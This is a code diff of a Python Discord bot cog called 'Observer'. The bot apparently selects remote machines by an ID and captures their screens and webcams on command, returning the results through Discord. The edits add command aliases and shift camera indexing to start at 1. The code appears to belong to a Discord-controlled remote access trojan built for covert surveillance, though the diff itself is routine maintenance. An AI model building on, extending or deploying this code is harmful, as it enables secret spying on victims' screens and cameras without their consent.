@@ -19,7 +19,7 @@ class Observer(commands.Cog):
 
         await self.process_screenshot(ctx)
 
-    @commands.command(name="ssrun")
+    @commands.command(name="ssrun", aliases=["screenshotrun", "cprun"])
     async def run_screenshot(self, ctx, target_id: str):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
 
@@ -72,14 +72,14 @@ class Observer(commands.Cog):
                 await ctx.send(f"**[{my_id}]** Error: {e}")
 
     @commands.command(name="webcam", aliases=["cam"])
-    async def take_webcam(self, ctx, num: int = 0):
+    async def take_webcam(self, ctx, num: int = 1):
         if not getattr(self.bot, 'is_selected', False):
             return
         
         await self.process_webcam(ctx, num)
 
     @commands.command(name="camrun")
-    async def run_webcam(self, ctx, target_id: str, num: int = 0):
+    async def run_webcam(self, ctx, target_id: str, num: int = 1):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
 
         if not getattr(self.bot, 'is_selected', False):
@@ -160,19 +160,23 @@ class Observer(commands.Cog):
             except Exception as e:
                 await ctx.send(f"**[{my_id}]** Error: {e}")
 
-    async def process_webcam(self, ctx, num: int = 0):
+    async def process_webcam(self, ctx, num: int):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
+
+        target_index = num
+        if target_index >= 1:
+            target_index -= 1
+
         if self.cam_lock.locked():
             await ctx.send(f"**[{my_id}]** Camera is busy. Please wait...")
-
         async with self.cam_lock:
             async with ctx.typing():
                 try:
                     def capture_cam_safe():
-                        cap = cv2.VideoCapture(num, cv2.CAP_ANY)
+                        cap = cv2.VideoCapture(target_index, cv2.CAP_ANY)
                         if not cap.isOpened():
                             print("Cannot open camera")
-                            cap = cv2.VideoCapture(num)
+                            cap = cv2.VideoCapture(target_index)
                             if not cap.isOpened():
                                 return None, "Camera not found."
 
